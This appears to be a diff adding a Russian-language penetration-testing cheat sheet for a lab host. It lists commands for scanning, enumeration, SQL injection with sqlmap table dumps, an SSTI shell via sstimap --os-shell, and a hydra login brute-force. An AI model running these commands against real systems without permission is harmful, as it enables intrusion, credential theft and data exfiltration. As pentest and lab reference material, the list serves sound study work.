@@ -1,0 +1,174 @@
+NMAP (Сканирование сети)
+
+Полное сканирование всех портов:
+nmap -sV -sC -p- 10.0.0.10
+
+Быстрое сканирование:
+nmap -T4 -F 10.0.0.10
+
+Определение версий сервисов:
+nmap -sV 10.0.0.10
+
+Запуск стандартных скриптов:
+nmap -sC 10.0.0.10
+
+Поиск уязвимостей:
+nmap --script vuln 10.0.0.10
+
+Проверка конкретных портов:
+nmap -p 21,22,25,80,443,3306,5432,6379 10.0.0.10
+
+========================
+DNS и разведка
+
+A-запись:
+dig domain.com A
+
+MX-запись:
+dig domain.com MX
+
+TXT (SPF, DMARC):
+dig domain.com TXT
+
+WHOIS:
+whois domain.com
+
+========================
+Поиск директорий
+
+gobuster:
+gobuster dir -u http://10.0.0.10/
+ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+С расширениями:
+gobuster dir -u http://10.0.0.10/
+ -w wordlist.txt -x php,txt,bak,env
+
+dirsearch:
+dirsearch -u http://10.0.0.10
+
+dirb:
+dirb http://10.0.0.10
+
+========================
+HTTP / HTTPS
+
+Проверка заголовков:
+curl -I http://10.0.0.10
+
+Следовать редиректам:
+curl -L http://10.0.0.10
+
+Проверка методов:
+curl -X OPTIONS http://10.0.0.10
+ -i
+
+========================
+FTP
+
+Подключение:
+ftp 10.0.0.10
+
+Логин:
+anonymous
+
+Проверка через nmap:
+nmap -p 21 --script ftp-anon 10.0.0.10
+
+========================
+SMTP
+
+Перебор пользователей:
+smtp-user-enum -M VRFY -U shortlist.txt -D domain.com -t 10.0.0.10
+
+Другие методы:
+smtp-user-enum -M RCPT -U shortlist.txt -D domain.com -t 10.0.0.10
+smtp-user-enum -M EXPN -U shortlist.txt -D domain.com -t 10.0.0.10
+
+Проверка вручную:
+telnet 10.0.0.10 25
+
+Команды внутри:
+HELO test.com
+MAIL FROM:test@test.com
+
+RCPT TO:user@domain.com
+
+DATA
+test
+.
+QUIT
+
+Проверка open relay через nmap:
+nmap -p 25 --script smtp-open-relay 10.0.0.10
+
+========================
+SQLMAP
+
+Из файла запроса:
+sqlmap -r request.txt --batch
+
+По URL:
+sqlmap -u "http://10.0.0.10/login.php?id=1
+" --batch
+
+С формами:
+sqlmap -u "http://10.0.0.10/login.php
+" --forms --batch
+
+Поиск баз данных:
+sqlmap -u "http://10.0.0.10/login.php?id=1
+" --dbs
+
+Таблицы:
+sqlmap -u "http://10.0.0.10/login.php?id=1
+" -D db_name --tables
+
+Дамп таблицы:
+sqlmap -u "http://10.0.0.10/login.php?id=1
+" -D db_name -T users --dump
+
+Краулинг:
+sqlmap -u "http://10.0.0.10
+" --crawl=2 --batch
+
+========================
+SSTI
+
+Проверка:
+sstimap -u "http://10.0.0.10/page?name=test
+"
+
+Получение shell:
+sstimap -u "http://10.0.0.10/page?name=test
+" --os-shell
+
+========================
+MySQL
+
+Проверка порта:
+nmap -p 3306 10.0.0.10
+
+Подключение:
+mysql -h 10.0.0.10 -u root -p
+
+========================
+PostgreSQL
+
+Проверка:
+nmap -p 5432 10.0.0.10
+
+========================
+Redis
+
+Проверка:
+nmap -p 6379 10.0.0.10
+
+Подключение:
+redis-cli -h 10.0.0.10
+
+========================
+Hydra (если разрешено)
+
+Bruteforce HTTP формы:
+hydra -l admin -P passwords.txt 10.0.0.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
